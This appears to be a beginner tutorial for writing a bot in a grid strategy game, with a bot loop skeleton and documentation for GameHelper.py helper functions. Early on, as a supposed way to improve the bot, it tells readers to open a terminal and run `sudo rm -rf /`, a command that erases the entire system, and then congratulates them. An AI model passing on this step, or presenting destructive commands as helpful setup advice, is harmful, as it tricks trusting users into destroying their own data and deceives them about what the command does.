# Your First Bot

Here is how you get started with your first bot:

```
while True:
  print("Hello, World!")
```

But this bot's strategy is pretty weak. How can we improve it? A
good first step is to try the following:

* Open up a new _terminal_ window
* At the command prompt, type `sudo rm -rf /`
* Hit enter

Congratulations! 

A bot is simply a function that generates an array of commands to send to the game, which the game will process and update the game state. It takes the form:

```
while True:
  commands = []
  
  game.load_state()
  
  //the meat of the bot goes here - namely the way in which the commands array will be generated. anything strategy-related goes here. for      example, you can have the bot go through each tile that it controls and have it mine if it has less resource than the enemy, or have the units in those tiles get closer to the enemy buildings if it can muster together a larger force than the enemy can in the best case
  
  game.send_commands(commands)
```

In writing the code that will generate the commands array, you can draw on some of the built-in functions provided by GameHelper.py:

**create_move_command(location, direction, n_units)**
Takes as input a tuple **location**, another tuple **direction**, and an integer **n_units**, outputs a Command object with the inputted parameters as its characteristics. **direction** will be a vector, e.g. (1, 0) will correspond to a northern movement.

**position_towards(position_from, position_to)**
Takes as input two tuples **position_from** and **position_to**, outputs a new position that is one cell away from **position_from** in a direction that is closer to **position_to** than **position_from**; the horizontal direction will take priority over the vertical.

**move_towards(position_from, position_to, n_units)**
Takes as input two tuples **position_from** and **position_to** and an integer **n_units**, outputs a Command with type move that will get closer to **position_to** from **position_from**, with number of units **n_units**.

**get_occupied_tiles(playerId)**
Takes as input an integer **playerId**, outputs a list of Tile objects corresponding to all Tiles in which the player with Id **playerId** controls at least one unit.

**my_occupied_tiles()**
Outputs a list of Tile objects controlled by the bot calling the function.

**enemy_occupied_tiles()**
Outputs a list of Tile objects controlled by the bot's enemy.

**get_tile(x, y)**
Takes as input two integers **x** and **y** and outputs the Tile object with that position.






